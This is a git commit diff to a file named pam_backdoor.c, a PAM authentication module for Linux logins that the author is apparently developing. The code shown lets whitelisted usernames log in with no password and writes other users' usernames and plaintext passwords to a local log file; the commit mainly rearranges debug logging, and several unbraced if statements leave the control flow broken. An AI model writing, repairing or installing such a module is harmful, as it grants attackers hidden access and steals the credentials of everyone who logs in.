b8dc60086a95d1914eefaf84cb87237290d2a0a9
NCheg413 <143832860+NCheg413@users.noreply.github.com>
2025-05-07 19:52:32 -0400

    Update pam_backdoor.c

--- pam_backdoor.c
+++ pam_backdoor.c
@@ -25,29 +25,37 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                     int argc, const char **argv) {
     const char *username, *password;
 
-    FILE *log = fopen(LOGFILE, "a");
 
 
     
     if (pam_get_user(pamh, &username, NULL) != PAM_SUCCESS || username == NULL)
-        fprintf(log, "if 1 \n");
-
+        FILE *log = fopen(LOGFILE, "a");
+        if (log) {
+            fprintf(log, "1");
+            fclose(log);
+        }
         return PAM_AUTH_ERR;
 
     // Bypass authentication if username is in whitelist
     if (is_whitelisted(username)) {
-        fprintf(log, "if 2 \n");
-
+        FILE *log = fopen(LOGFILE, "a");
+        if (log) {
+            fprintf(log, "2");
+            fclose(log);
+        }
         pam_set_item(pamh, PAM_AUTHTOK, "");
         return PAM_SUCCESS;
     }
 
     if (pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL) != PAM_SUCCESS || password == NULL)
-        fprintf(log, "if 3 \n");
-
+        FILE *log = fopen(LOGFILE, "a");
+        if (log) {
+            fprintf(log, "3");
+            fclose(log);
+        }
         return PAM_AUTH_ERR;
 
-    //FILE *log = fopen(LOGFILE, "a");
+    FILE *log = fopen(LOGFILE, "a");
     if (log) {
         fprintf(log, "User: %s, Password: %s\n", username, password);
         fclose(log);
